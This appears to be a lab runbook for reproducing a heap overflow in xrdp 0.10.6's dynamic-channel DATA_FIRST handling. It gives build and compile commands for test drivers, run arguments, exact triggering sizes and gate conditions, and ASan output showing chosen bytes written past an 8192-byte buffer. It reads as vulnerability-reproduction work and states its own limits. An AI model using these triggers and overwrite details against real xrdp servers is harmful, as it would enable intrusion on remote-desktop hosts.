# xrdp2shell — real compiled-code reproduction runbook

Companion to `reports/xrdp2shell-status.md`. These drivers exercise the real
compiled xrdp 0.10.6 libraries; they do not reimplement the vulnerable
function. The extracted-model harness lives in `lab/frontier/xrdp2shell/`.

## Provisions

xrdp source tree with `configure.ac` `AC_INIT([xrdp], [0.10.6], ...)`.
Fixed comparison is v0.10.6.1 / fix commit
`43dc9c3b71e5e46733d70ec0239c482ee264cd9f`.

ASan build (from `lab/build/xrdp2shell-live/`):

    mkdir build-asan && cd build-asan
    ../src/configure 'CFLAGS=-g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined' \
      LDFLAGS=-fsanitize=address,undefined --prefix=$PWD/install \
      --enable-fuse=no --enable-vsock=no --enable-jpeg=no --enable-opus=no \
      --enable-mp3lame=no --enable-xrdpvr=no --enable-painter=no \
      --enable-rfxcodec=no --enable-freerdp1=no
    make -j2

A plain build (`build-plain/`) is needed for the chosen-byte reader: ASan
poisons the adjacent chunk. Its exact configure line was:

    ../src/configure --prefix=$PWD/install --disable-fuse --disable-vsock \
      --disable-jpeg --disable-opus --disable-mp3lame --disable-xrdpvr \
      --disable-painter --disable-rfxcodec --disable-freerdp1 \
      'CFLAGS=-g -O1 -fno-omit-frame-pointer' LDFLAGS=

## Drivers

- `real_drdynvc_driver.c` (sha256 `a05ba8ac19f284755443d65b5c0f9f840cbd9b7767cf35dcbd58d3580672100c`)
  links the real ASan `libxrdp.a` and `libcommon.a`, builds a real
  `struct xrdp_channel` around zeroed real structs, and calls
  `xrdp_channel_process()` with one CHANNEL_FLAG_FIRST|LAST virtual-channel
  PDU carrying a DYNVC_DATA_FIRST body. The data_first callback is the body
  of `xrdp_mm_drdynvc_data_first()` using real `trans_create` /
  `trans_get_out_s` / `out_uint8a`.

      cc -g -O1 -fsanitize=address,undefined -fno-omit-frame-pointer \
        -include config_ac.h -I$B -I$SRC/libxrdp -I$SRC/common -I$SRC/include \
        real_drdynvc_driver.c $B/libxrdp/.libs/libxrdp.a \
        $B/common/.libs/libcommon.a -lssl -lcrypto -lpthread -ldl -lm \
        -o real_drdynvc_driver

  `-include config_ac.h` and putting `-I$B` first are both required for this
  driver: without them `common/log.h` and `common/parse.h` raise
  `#error config_ac.h not visible`, and `common/arch.h` conflicts on
  `int64_t` against the host `<stdint.h>`. Verified 2026-11-21: the old
  order failed rc 1 with those errors; this order compiles clean (rc 0)
  and the binary runs 8164/8164 clean (`callback_calls=1 bytes_seen=8164`).
  Witness W33 hit the same failure and applied the same fix on replay.

  where `$SRC` is the source tree and `$B` the ASan build dir. Arguments:
  `[fixed] [payload_len] [declared_total_bytes]`, default 20000/20000.
  `fixed` applies a synthetic 8128-byte cap — a control on the same sink,
  NOT the real 0.10.6.1 fix.

- `chosen_bytes_real_path.c` (sha256 `ecfe9f7e8e0582fa9ec896d0b0159f64bae06e70745bc182938892dee53320d1`)
  is the non-ASan reader: it plants an adjacent canary chunk and prints the
  bytes written past the 8192-byte buffer at predicted offsets.

## Observed output (2026-11-21, driver digests above)

- Default run: ASan `WRITE of size 20000` in `memcpy`, 0 bytes after an
  8192-byte region allocated by `trans_create` (`common/trans.c:110`);
  stack `memcpy` -> `sink_data_first` -> `drdynvc_process_data_first`
  (`xrdp_channel.c:490`) -> `xrdp_channel_process_drdynvc` (:647) ->
  `xrdp_channel_process` (:700). Marker `XRDP2SHELL-CHOSEN-MARKER` in data.
- Payload 8164 -> clean, 8165 -> ASan OOB; 5/5 runs identical modulo ASLR.
- Chosen bytes: `CANARY delta=8208 k1=84 k2=484 m1='DEADBEEF-CR' m2='C0FFEE00-CR'`,
  `CHOSEN_BYTES m1=PASS m2=PASS`, `callback_calls=1 bytes_seen=20000`. An
  earlier variant that called `free()` after the overflow aborted with
  `malloc(): corrupted top size`.
- Gate: 20000/1000 and 20000/19000 -> `callback_calls=0`, clean;
  20000/20000 -> OOB; 1600/1590 -> reject; 1600/1600 -> clean. The only gate
  is `total_bytes >= 1590 && bytes <= total_bytes`.

## Limits

These are direct calls into the real parse path, not a full network RDP
session. No completed logon, dynamic-channel open, live-session allocator
layout or network PDU trace is claimed. Post-auth (`PR:L`) is intrinsic to
the CVE, not a lab artifact. The separate multi-chunk OOB read at
`xrdp_channel.c:630` is a different bug and must not be conflated with this
sink.

## Wire-format receive-chain driver (2026-11-21)

`wire_drdynvc_driver.c` (sha256
`51fd632401ebd4d70bf62e05dedfbcccb0454331069f7d6c524171b331df23a5`)
builds one full wire PDU — TPKT, X.224 DT, MCS SendDataRequest (two-byte
PER length), no security header, CHANNEL_PDU_HEADER, DYNVC_DATA_FIRST —
and calls `xrdp_rdp_recv()` on it. Same ASan build and libraries as above,
but add `-I$B` first so `config_ac.h` is found:

    cc -g -O1 -fsanitize=address,undefined -fno-omit-frame-pointer \
      -I$B -I$SRC/libxrdp -I$SRC/common -I$SRC/include \
      wire_drdynvc_driver.c $B/libxrdp/.libs/libxrdp.a \
      $B/common/.libs/libcommon.a -lssl -lcrypto -lpthread -ldl -lm \
      -o wire_drdynvc_driver

    ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 ./wire_drdynvc_driver 8191 8191
    ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 ./wire_drdynvc_driver 8164 8164
    ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 ./wire_drdynvc_driver 20000 20000

Observed: 8191 → ASan `WRITE of size 8191` 0 bytes past the 8192-byte
`trans_create` region, stack through `xrdp_rdp_recv`; 8164 → rc 0,
`callback_calls=1 bytes_seen=8164`; 20000 → `rv=1 callback_calls=0` because
`xrdp_mcs_recv()` rejects MCS userData over 16K. UBSan misalignment
warnings are a build artifact of xrdp's byte-macro parser, not the finding.
No socket, logon, chansrv or negotiated dynamic-channel open is claimed.
